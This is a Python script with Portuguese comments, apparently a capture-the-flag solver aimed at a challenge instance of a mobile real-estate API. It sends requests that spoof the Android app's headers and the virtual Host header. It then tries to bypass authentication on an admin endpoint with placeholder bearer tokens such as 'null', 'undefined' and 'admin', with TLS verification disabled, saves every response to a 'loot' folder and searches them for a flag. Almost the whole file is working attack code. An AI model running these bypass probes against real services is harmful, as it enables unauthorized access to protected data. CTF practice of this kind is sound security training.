#!/usr/bin/env python3
import json
import re
import sys
from pathlib import Path

import requests
from urllib3.exceptions import InsecureRequestWarning

# Desativa warning de certificado porque desafios CTF frequentemente usam TLS próprio/proxy.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Host vivo informado pela instância do desafio.
TARGET_HOST = "87e6bb1481310f67.chal.ctf.ae"

# Criamos pasta de loot para guardar evidências e facilitar o writeup.
Path("loot").mkdir(exist_ok=True)

# Bases HTTP e HTTPS porque a plataforma marca como HTTP, mas muitos desafios também aceitam HTTPS.
BASES = [
    f"https://{TARGET_HOST}",
    f"http://{TARGET_HOST}",
]

# Headers observados no código decompilado do app Android.
MOBILE_HEADERS = {
    "X-App-Version": "3.7.2",
    "X-Platform": "android",
    "User-Agent": "FluidRealty/3.7.2 Android WebView",
    "Accept": "application/json, text/plain, */*",
}

# Algumas aplicações por trás de proxy validam Host virtual.
# Por isso testamos tanto o Host normal do challenge quanto o Host do código mobile.
HOST_VARIANTS = [
    ("default-host", {}),
    ("api-fluidrealty-host", {"Host": "api.fluidrealty.co"}),
]

# Variações de Authorization para testar falha clássica de backend aceitando valor nulo/falso.
AUTH_VARIANTS = [
    ("sem-auth", None),
    ("bearer-null", "Bearer null"),
    ("bearer-undefined", "Bearer undefined"),
    ("bearer-none", "Bearer None"),
    ("bearer-empty", "Bearer "),
    ("bearer-admin", "Bearer admin"),
    ("bearer-mobile", "Bearer mobile"),
    ("bearer-guest", "Bearer guest"),
    ("bearer-false", "Bearer false"),
    ("bearer-zero", "Bearer 0"),
]

# Endpoints revelados em ApiService.java.
ENDPOINTS = [
    ("public-properties", "/api/properties"),
    ("public-properties-city-empty", "/api/properties?city="),
    ("admin-properties", "/api/properties/admin"),
]

def pretty_body(text):
    """
    Tenta formatar JSON.
    Se não for JSON, retorna texto puro.
    """
    try:
        parsed = json.loads(text)
        return json.dumps(parsed, indent=2, ensure_ascii=False)
    except Exception:
        return text

def save_response(name, response):
    """
    Salva status, headers e corpo da resposta em arquivo.
    """
    safe_name = re.sub(r"[^a-zA-Z0-9_.-]+", "_", name)
    path = Path("loot") / f"{safe_name}.txt"

    content = []
    content.append(f"URL: {response.url}")
    content.append(f"STATUS: {response.status_code}")
    content.append("")
    content.append("HEADERS:")
    for key, value in response.headers.items():
        content.append(f"{key}: {value}")
    content.append("")
    content.append("BODY:")
    content.append(pretty_body(response.text))

    path.write_text("\n".join(content), encoding="utf-8")
    return path

def show_result(label, response):
    """
    Mostra uma visão curta no terminal e salva resposta completa.
    """
    path = save_response(label, response)
    body = response.text

    print()
    print("=" * 90)
    print(label)
    print("=" * 90)
    print(f"URL: {response.url}")
    print(f"Status: {response.status_code}")
    print(f"Tamanho: {len(body)} bytes")
    print(f"Salvo em: {path}")

    preview = pretty_body(body)
    if len(preview) > 1200:
        preview = preview[:1200] + "\n...[cortado no preview, resposta completa salva no loot]"

    print()
    print(preview)

    # Procura flag no corpo da resposta.
    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)
    if match:
        flag = match.group(0)
        print()
        print("=" * 90)
        print("[+] FLAG ENCONTRADA")
        print("=" * 90)
        print(flag)
        Path("flag.txt").write_text(flag + "\n", encoding="utf-8")
        print("[+] Flag salva em flag.txt")
        sys.exit(0)

def request_once(base, host_label, host_headers, endpoint_label, path, auth_label, auth_value):
    """
    Executa uma requisição única com combinação de base, host, endpoint e auth.
    """
    headers = {}
    headers.update(MOBILE_HEADERS)
    headers.update(host_headers)

    if auth_value is not None:
        headers["Authorization"] = auth_value

    url = base + path
    label = f"{base}_{host_label}_{endpoint_label}_{auth_label}"

    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=12,
            verify=False,
            allow_redirects=False,
        )
        show_result(label, response)
    except requests.RequestException as exc:
        print()
        print("=" * 90)
        print(label)
        print("=" * 90)
        print(f"Erro de requisição: {exc}")

def main():
    print("[*] Iniciando enumeração da API FluidRealty")
    print(f"[*] Target: {TARGET_HOST}")
    print("[*] Headers móveis baseados no código Android:")
    print(json.dumps(MOBILE_HEADERS, indent=2, ensure_ascii=False))

    for base in BASES:
        for host_label, host_headers in HOST_VARIANTS:
            for endpoint_label, path in ENDPOINTS:
                # Endpoints públicos são testados sem Authorization.
                if "admin" not in endpoint_label:
                    request_once(
                        base,
                        host_label,
                        host_headers,
                        endpoint_label,
                        path,
                        "sem-auth",
                        None,
                    )
                    continue

                # Endpoint admin é testado com várias formas de token.
                for auth_label, auth_value in AUTH_VARIANTS:
                    request_once(
                        base,
                        host_label,
                        host_headers,
                        endpoint_label,
                        path,
                        auth_label,
                        auth_value,
                    )

    print()
    print("=" * 90)
    print("RESULTADO")
    print("=" * 90)
    print("[-] Flag não encontrada automaticamente.")
    print("[*] Verifique os arquivos em loot/, principalmente respostas 200, 401, 403 e diferenças de tamanho.")

if __name__ == "__main__":
    main()
